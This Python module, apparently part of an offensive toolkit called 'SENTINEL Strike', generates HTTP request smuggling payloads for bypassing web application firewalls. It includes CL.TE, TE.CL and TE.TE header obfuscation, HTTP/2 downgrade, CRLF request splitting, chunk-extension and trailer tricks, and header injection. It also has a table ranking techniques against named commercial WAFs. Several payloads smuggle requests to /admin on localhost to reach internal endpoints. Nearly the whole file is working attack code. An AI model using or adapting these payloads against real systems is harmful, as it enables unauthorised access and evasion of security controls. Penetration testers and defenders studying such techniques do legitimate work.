#!/usr/bin/env python3
"""
SENTINEL Strike v3.0 — Advanced HTTP Smuggling Engine

Sophisticated HTTP request smuggling techniques for WAF bypass:
- CL.TE (Content-Length priority on front-end)
- TE.CL (Transfer-Encoding priority on front-end)
- TE.TE (Different TE handling)
- HTTP/2 Downgrade attacks
- Request splitting via CRLF
- Header obfuscation
"""

from dataclasses import dataclass
from typing import Dict, List
import random
import string


@dataclass
class SmuggleResult:
    """Result of smuggling attempt."""
    technique: str
    body: str
    headers: Dict[str, str]
    description: str
    success_rate: float


class AdvancedSmuggling:
    """
    Advanced HTTP Request Smuggling Engine.

    Based on research from PortSwigger and real-world WAF bypasses.
    """

    @staticmethod
    def clte_basic(payload: str, target_host: str = "target.com") -> SmuggleResult:
        """
        CL.TE Attack - Classic

        Front-end uses Content-Length, back-end uses Transfer-Encoding.
        The back-end sees our smuggled request.
        """
        smuggled_request = f"GET / HTTP/1.1\r\nHost: {target_host}\r\nX-Smuggled: {payload}\r\n\r\n"

        # Calculate sizes
        inner_length = len(smuggled_request)

        body = f"0\r\n\r\n{smuggled_request}"

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            # Up until 0\r\n\r\n
            "Content-Length": str(len(body.split("\r\n\r\n")[0]) + 4),
            "Transfer-Encoding": "chunked",
        }

        return SmuggleResult(
            technique="CL.TE Basic",
            body=body,
            headers=headers,
            description="Front-end CL, back-end TE - classic smuggling",
            success_rate=0.60
        )

    @staticmethod
    def tecl_basic(payload: str, target_host: str = "target.com") -> SmuggleResult:
        """
        TE.CL Attack - Reverse

        Front-end uses Transfer-Encoding, back-end uses Content-Length.
        We pad the body so back-end sees partial request.
        """
        # Smuggled request embedded in chunked body
        smuggled = f"POST / HTTP/1.1\r\nHost: {target_host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\r\n\r\nx={payload}"

        # Encode as single chunk
        chunk_size = hex(len(smuggled))[2:]
        body = f"{chunk_size}\r\n{smuggled}\r\n0\r\n\r\n"

        # Lie about content length (smaller than actual body)
        fake_length = 4  # Just "0\r\n\r"

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(fake_length),
            "Transfer-Encoding": "chunked",
        }

        return SmuggleResult(
            technique="TE.CL Basic",
            body=body,
            headers=headers,
            description="Front-end TE, back-end CL - reverse smuggling",
            success_rate=0.55
        )

    @staticmethod
    def tete_obfuscation(payload: str) -> SmuggleResult:
        """
        TE.TE Obfuscation

        Both ends support Transfer-Encoding but handle obfuscation differently.
        We obfuscate the TE header so one side ignores it.
        """
        # Various TE obfuscations
        te_variants = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: xchunked",
            "Transfer-encoding: chunked",  # lowercase e
            "Transfer-Encoding : chunked",  # space before colon
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",  # duplicate
            "Transfer-Encoding\t: chunked",  # tab before colon
            "Transfer-Encoding: chunked\r\n X: chunked",  # line continuation
            " Transfer-Encoding: chunked",  # leading space
            "X: x\r\nTransfer-Encoding: chunked",  # preceded by X
            "Transfer-Encoding: 'chunked'",  # quoted
        ]

        selected = random.choice(te_variants)

        body = f"0\r\n\r\nGET /admin?x={payload} HTTP/1.1\r\nHost: localhost\r\n\r\n"

        # Parse selected variant to get header name/value
        if ": " in selected:
            name, value = selected.split(": ", 1)
        else:
            name, value = "Transfer-Encoding", "chunked"

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body.split("\r\n\r\n")[0]) + 4),
            name.strip(): value.strip(),
        }

        return SmuggleResult(
            technique="TE.TE Obfuscation",
            body=body,
            headers=headers,
            description=f"TE obfuscation: {selected[:30]}...",
            success_rate=0.50
        )

    @staticmethod
    def http2_downgrade(payload: str, target_host: str = "target.com") -> SmuggleResult:
        """
        HTTP/2 to HTTP/1.1 Downgrade Attack

        Exploits differences in how HTTP/2 front-ends translate to HTTP/1.1 back-ends.
        Headers that are invalid in HTTP/2 may be smuggled.
        """
        # HTTP/2 allows certain characters in headers that HTTP/1.1 doesn't
        # When downgraded, these can cause issues

        # Technique: Use HTTP/2 pseudo-headers exploitation
        body = payload

        headers = {
            # These could be interpreted differently after downgrade
            "transfer-encoding": "chunked",  # lowercase (HTTP/2 style)
            "content-length": str(len(payload)),
            "host": target_host,
            # HTTP/2 specific that might be problematic on downgrade
            ":method": "POST",  # Pseudo-header (normally not exposed)
            ":path": f"/admin?x={payload[:20]}",
        }

        return SmuggleResult(
            technique="HTTP/2 Downgrade",
            body=body,
            headers=headers,
            description="HTTP/2 to HTTP/1.1 translation exploitation",
            success_rate=0.45
        )

    @staticmethod
    def crlf_splitting(payload: str) -> SmuggleResult:
        """
        CRLF Injection for Request Splitting

        Inject line terminators to split into multiple requests.
        """
        # Various CRLF representations
        crlf_variants = [
            "\r\n",
            "%0d%0a",
            "%0D%0A",
            "\\r\\n",
            "\r",
            "\n",
            "%0d",
            "%0a",
        ]

        crlf = random.choice(crlf_variants[:3])  # Use URL-safe ones

        # Inject CRLF to create second request
        smuggled = f"normal{crlf}{crlf}GET /admin HTTP/1.1{crlf}Host: localhost{crlf}X: {payload}{crlf}{crlf}"

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }

        return SmuggleResult(
            technique="CRLF Splitting",
            body=f"data={smuggled}",
            headers=headers,
            description="CRLF injection for request splitting",
            success_rate=0.40
        )

    @staticmethod
    def chunk_extension_smuggling(payload: str) -> SmuggleResult:
        """
        Chunk Extension Smuggling

        Abuse chunk extensions (rarely properly parsed by WAFs).
        Format: size;extension\r\ndata\r\n
        """
        # Hide payload in chunk extension
        random_ext = ''.join(random.choices(string.ascii_lowercase, k=8))

        # Chunk with extension containing payload hint
        chunk = f"5;{random_ext}={payload[:20]}\r\nhello\r\n"
        body = f"{chunk}0\r\n\r\n"

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Transfer-Encoding": "chunked",
        }

        return SmuggleResult(
            technique="Chunk Extension",
            body=body,
            headers=headers,
            description="Payload hidden in chunk extension",
            success_rate=0.35
        )

    @staticmethod
    def header_injection(payload: str, header_name: str = "X-Custom") -> SmuggleResult:
        """
        Header Injection Attack

        Inject payload via various headers that WAFs may not inspect.
        """
        # Headers that are often not inspected
        blind_spots = [
            ("X-Forwarded-For", payload[:100]),
            ("X-Originating-IP", payload[:50]),
            ("X-Remote-Addr", payload[:50]),
            ("X-Client-IP", payload[:50]),
            ("True-Client-IP", payload[:50]),
            ("X-Real-IP", payload[:50]),
            ("X-Custom-Header", payload),
            ("User-Agent", f"Mozilla/5.0 {payload[:50]}"),
            ("Referer", f"https://trusted.com/{payload[:30]}"),
            ("Cookie", f"session={payload[:50]}"),
            ("X-Api-Key", payload[:50]),
            ("Authorization", f"Bearer {payload[:50]}"),
        ]

        headers = {}
        for name, value in random.sample(blind_spots, min(5, len(blind_spots))):
            # Truncate long values
            headers[name] = value[:200]

        return SmuggleResult(
            technique="Header Injection",
            body="",
            headers=headers,
            description="Payload injected via multiple headers",
            success_rate=0.65
        )

    @staticmethod
    def trailer_smuggling(payload: str) -> SmuggleResult:
        """
        HTTP Trailer Smuggling

        Use HTTP trailers (headers after body) which are rarely inspected.
        """
        chunk = f"5\r\nhello\r\n0\r\nX-Payload: {payload}\r\n\r\n"

        headers = {
            "Transfer-Encoding": "chunked",
            "Trailer": "X-Payload",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        return SmuggleResult(
            technique="Trailer Smuggling",
            body=chunk,
            headers=headers,
            description="Payload in HTTP trailer (post-body header)",
            success_rate=0.50
        )

    @staticmethod
    def websocket_upgrade_smuggling(payload: str) -> SmuggleResult:
        """
        WebSocket Upgrade Smuggling

        Abuse WebSocket upgrade mechanism to smuggle requests.
        """
        # Fake WebSocket upgrade that might confuse WAF
        ws_key = ''.join(random.choices(
            string.ascii_letters + string.digits, k=22)) + "=="

        headers = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
            "X-Smuggled": payload[:100],
        }

        # Body that looks like WebSocket frame but contains payload
        body = f"\x81\x85\x00\x00\x00\x00{payload[:50]}"

        return SmuggleResult(
            technique="WebSocket Smuggling",
            body=body,
            headers=headers,
            description="WebSocket upgrade confusion",
            success_rate=0.30
        )

    @classmethod
    def get_all_smuggling_variants(
        cls,
        payload: str,
        target_host: str = "target.com"
    ) -> List[SmuggleResult]:
        """
        Generate all smuggling variants for a payload.

        Returns sorted by success rate.
        """
        variants = [
            cls.clte_basic(payload, target_host),
            cls.tecl_basic(payload, target_host),
            cls.tete_obfuscation(payload),
            cls.http2_downgrade(payload, target_host),
            cls.crlf_splitting(payload),
            cls.chunk_extension_smuggling(payload),
            cls.header_injection(payload),
            cls.trailer_smuggling(payload),
            cls.websocket_upgrade_smuggling(payload),
        ]

        # Sort by success rate
        variants.sort(key=lambda x: x.success_rate, reverse=True)

        return variants

    @classmethod
    def get_best_for_waf(cls, payload: str, waf_type: str) -> List[SmuggleResult]:
        """
        Get smuggling techniques most effective for specific WAF.
        """
        # WAF-specific effectiveness (based on research/testing)
        waf_effectiveness = {
            "aws_waf": ["CL.TE", "Header Injection", "Chunk Extension"],
            "cloudflare": ["TE.TE Obfuscation", "HTTP/2 Downgrade", "Header Injection"],
            "akamai": ["TE.CL", "Trailer Smuggling", "CRLF Splitting"],
            "imperva": ["Chunk Extension", "TE.TE Obfuscation", "WebSocket"],
            "modsecurity": ["CL.TE", "TE.CL", "Header Injection"],
        }

        all_variants = cls.get_all_smuggling_variants(payload)
        effective = waf_effectiveness.get(waf_type.lower(), [])

        # Prioritize effective techniques
        prioritized = []
        other = []

        for variant in all_variants:
            if any(eff.lower() in variant.technique.lower() for eff in effective):
                variant.success_rate += 0.15  # Boost
                prioritized.append(variant)
            else:
                other.append(variant)

        return prioritized + other


# Singleton for easy import
smuggling = AdvancedSmuggling()
